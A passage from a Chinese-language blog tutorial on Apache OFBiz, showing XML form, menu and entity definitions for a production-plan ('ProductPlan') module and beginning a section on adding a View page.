<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;single&quot;</span> <span class="attr">target</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">default-map-name</span>=<span class="string">&quot;ProductPlan&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">header-row-style</span>=<span class="string">&quot;header-row&quot;</span> <span class="attr">default-table-style</span>=<span class="string">&quot;basic-table&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;submitButton&quot;</span> <span class="attr">title</span>=<span class="string">&quot;$&#123;uiLabelMap.CommonFind&#125;&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">submit</span> <span class="attr">button-type</span>=<span class="string">&quot;button&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- ！！！一定要注意list-name必须是listIt --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;ListProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;list&quot;</span> <span class="attr">list-name</span>=<span class="string">&quot;listIt&quot;</span></span></span><br><span class="line"><span class="tag">   	  <span class="attr">paginate-target</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">default-entity-name</span>=<span class="string">&quot;ProductPlan&quot;</span></span></span><br><span class="line"><span class="tag">   	  <span class="attr">odd-row-style</span>=<span class="string">&quot;alternate-row&quot;</span> <span class="attr">default-table-style</span>=<span class="string">&quot;basic-table hover-bar&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">       	<span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;noConditionFind&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Y&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">service</span> <span class="attr">service-name</span>=<span class="string">&quot;performFind&quot;</span> <span class="attr">result-map</span>=<span class="string">&quot;result&quot;</span> <span class="attr">result-map-list</span>=<span class="string">&quot;listIt&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">field-map</span> <span class="attr">field-name</span>=<span class="string">&quot;inputFields&quot;</span> <span class="attr">from-field</span>=<span class="string">&quot;parameters&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">field-map</span> <span class="attr">field-name</span>=<span class="string">&quot;entityName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ProductPlan&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">widget-style</span>=<span class="string">&quot;buttontext&quot;</span> <span class="attr">title</span>=<span class="string">&quot;生产计划编号&quot;</span>&gt;</span></span><br><span class="line">   		<span class="tag">&lt;<span class="name">hyperlink</span> <span class="attr">description</span>=<span class="string">&quot;$&#123;productPlanId&#125;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;ViewProductPlan&quot;</span>&gt;</span></span><br><span class="line">   			<span class="comment">&lt;!-- 设定传递参数(parameter)的名字 --&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">param-name</span>=<span class="string">&quot;productPlanId&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">hyperlink</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">title</span>=<span class="string">&quot;项目编号&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">title</span>=<span class="string">&quot;负责人编号&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span> <span class="attr">title</span>=<span class="string">&quot;应用工程&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--type=&quot;date&quot;表示只显示日期--&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">title</span>=<span class="string">&quot;开始日期&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">title</span>=<span class="string">&quot;结束日期&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;createdStamp&quot;</span> <span class="attr">title</span>=<span class="string">&quot;创建时间&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;deleteLink&quot;</span> <span class="attr">title</span>=<span class="string">&quot; &quot;</span> <span class="attr">widget-style</span>=<span class="string">&quot;buttontext&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">hyperlink</span> <span class="attr">target</span>=<span class="string">&quot;RemoveProductPlan&quot;</span> <span class="attr">description</span>=<span class="string">&quot;$&#123;uiLabelMap.CommonDelete&#125;&quot;</span> <span class="attr">also-hidden</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">param-name</span>=<span class="string">&quot;productPlanId&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">hyperlink</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关于表单的配置规则一样可以参考上述那个文档。同时，也要注意几个<strong>关键点</strong>：target属性相当于一个请求，当表单进行提交的时候，会定向到该请求上，如：</p>
<ul>
<li>target&#x3D;”FindProductPlan”对应请求转到learning&#x2F;control&#x2F;FindProductPlan；</li>
<li>&lt;hyperlink&gt;标签相当于一个超链接；</li>
<li>在ListProductPlan表单的&lt;actions&gt;预处理动作中，调用了ofbiz自带的查找服务performFind，使用该功能时- 定要指明entity实体引擎即数据表的名字，同时使用该功能的&lt;form&gt;必须是type&#x3D;”list”，且list-name必须是listIt(因为performFind服务返回的就是一个name&#x3D;listIt列表)；</li>
<li>第二个表单中的几个target使用了，现在还未定义的请求映射，可以置之不理或删除即可。</li>
</ul>
<h4 id="6、创建菜单。"><a href="#6、创建菜单。" class="headerlink" title="6、创建菜单。"></a>6、创建菜单。</h4><p>在learning&#x2F;widget&#x2F;learningMenus.xml文件的名为MainAppBar&lt;menu&gt;标签中，添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">menu-item</span> <span class="attr">name</span>=<span class="string">&quot;ProductPlan&quot;</span> <span class="attr">title</span>=<span class="string">&quot;生产计划&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">&quot;FindProductPlan&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">menu-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="三、部署实体"><a href="#三、部署实体" class="headerlink" title="三、部署实体"></a>三、部署实体</h3><h4 id="1、在learning-x2F-entitydef-x2F-entitymodel-xml中，添加entity实体-即数据库表-："><a href="#1、在learning-x2F-entitydef-x2F-entitymodel-xml中，添加entity实体-即数据库表-：" class="headerlink" title="1、在learning&#x2F;entitydef&#x2F;entitymodel.xml中，添加entity实体(即数据库表)："></a>1、在learning&#x2F;entitydef&#x2F;entitymodel.xml中，添加entity实体(即数据库表)：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">entity</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlan&quot;</span> <span class="attr">package-name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;division&quot;</span> <span class="attr">type</span>=<span class="string">&quot;long-varchar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;stageIdenf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;tecnoDemand&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;preparationId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;designDemand&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;product&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;outCheck&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;documentPrepa&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;armyCheck&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;outJudge&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id-vlong&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureCompile&quot;</span> <span class="attr">type</span>=<span class="string">&quot;short-varchar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureJudge&quot;</span> <span class="attr">type</span>=<span class="string">&quot;short-varchar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureApprove&quot;</span> <span class="attr">type</span>=<span class="string">&quot;short-varchar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;date&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;departmentId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"> 	  <span class="tag">&lt;<span class="name">prim-key</span> <span class="attr">field</span>=<span class="string">&quot;productPlanId&quot;</span>/&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;ProductPlan_Item&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanItem&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;ProductPlan_Person&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;ProductPlan_Pre&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPreparation&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;preparationId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlanItem&quot;</span> <span class="attr">package-name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;category&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;secretLevel&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;source&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prim-key</span> <span class="attr">field</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span> <span class="attr">package-name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;department&quot;</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">type</span>=<span class="string">&quot;tel-number&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prim-key</span> <span class="attr">field</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlanPlan&quot;</span> <span class="attr">package-name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;department&quot;</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prim-key</span> <span class="attr">field</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;Product_Plan_Person&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;principleId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      	<span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlanPreparation&quot;</span> <span class="attr">package-name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;category&quot;</span> <span class="attr">type</span>=<span class="string">&quot;description&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;materialName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;applyFinishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;applyPrincipleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;processFinishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;processPrincipleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;inCheckFinishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;date-time&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;inCheckPrincipleId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prim-key</span> <span class="attr">field</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;Product_Pre_Person1&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;applyPrincipleId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      	<span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">      	<span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;Product_Pre_Person2&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;processPrincipleId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      	<span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">      	<span class="tag">&lt;<span class="name">relation</span> <span class="attr">type</span>=<span class="string">&quot;one&quot;</span> <span class="attr">fk-name</span>=<span class="string">&quot;Product_Pre_Person3&quot;</span> <span class="attr">rel-entity-name</span>=<span class="string">&quot;ProductPlanPerson&quot;</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">key-map</span> <span class="attr">field-name</span>=<span class="string">&quot;inCheckPrincipleId&quot;</span> <span class="attr">rel-field-name</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">      	<span class="tag">&lt;/<span class="name">relation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>实体配置规则同样参照上述文档，此处不再复述。</p>
<h4 id="2、利用相应的操作mysql数据库工具，对ProductPlan数据表新增一些数据。"><a href="#2、利用相应的操作mysql数据库工具，对ProductPlan数据表新增一些数据。" class="headerlink" title="2、利用相应的操作mysql数据库工具，对ProductPlan数据表新增一些数据。"></a>2、利用相应的操作mysql数据库工具，对ProductPlan数据表新增一些数据。</h4><h3 id="四、小有成就"><a href="#四、小有成就" class="headerlink" title="四、小有成就"></a>四、小有成就</h3><p>启动ofbiz，进入learning应用，点击菜单中的生产计划，即可看到FindProductPlan界面：<br><img src="/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B61/ofbiz.PNG" alt="FindProductPlan"></p>
<p>在搜索选项中输入数据项，点击查找，便可出现相应的搜索结果，查找功能暂且完成。但这仅仅是个小小的成果，还有View展示详细数据、Create新建数据、Remove删除数据、Edit修改数据等功能需要我们去实现。路漫漫其修远兮，吾将上下而求索···</p>
<h3 id="五、实现View功能"><a href="#五、实现View功能" class="headerlink" title="五、实现View功能"></a>五、实现View功能</h3><h4 id="1、由于ProductPlan数据表有很多字段，所以我们需要一个ViewProductPlan页面显示某一个数据项的详细信息。展现一个页面的基本步骤，可以参照本文第三部分："><a href="#1、由于ProductPlan数据表有很多字段，所以我们需要一个ViewProductPlan页面显示某一个数据项的详细信息。展现一个页面的基本步骤，可以参照本文第三部分：" class="headerlink" title="1、由于ProductPlan数据表有很多字段，所以我们需要一个ViewProductPlan页面显示某一个数据项的详细信息。展现一个页面的基本步骤，可以参照本文第三部分："></a>1、由于ProductPlan数据表有很多字段，所以我们需要一个ViewProductPlan页面显示某一个数据项的详细信息。展现一个页面的基本步骤，可以参照本文第三部分：</h4><ul>
<li>配置control.xml文件，将请求映射到视图，再由视图映射到具体的装饰器(screen)；</li>
<li>在装饰器xml配置文件中，通过该装饰器对视图进行布置，同时还要调用表单；</li>
<li>在表单xml配置文件中，完成被调用表单的配置。</li>
</ul>
<p>（PS：如果数据库表字段不多，仅通过上述FindProductPlan界面就能完全显示，那可以不需要View功能。）</p>
<h4 id="2、代码如下："><a href="#2、代码如下：" class="headerlink" title="2、代码如下："></a>2、代码如下：</h4><p>（1）control.xml:</p>
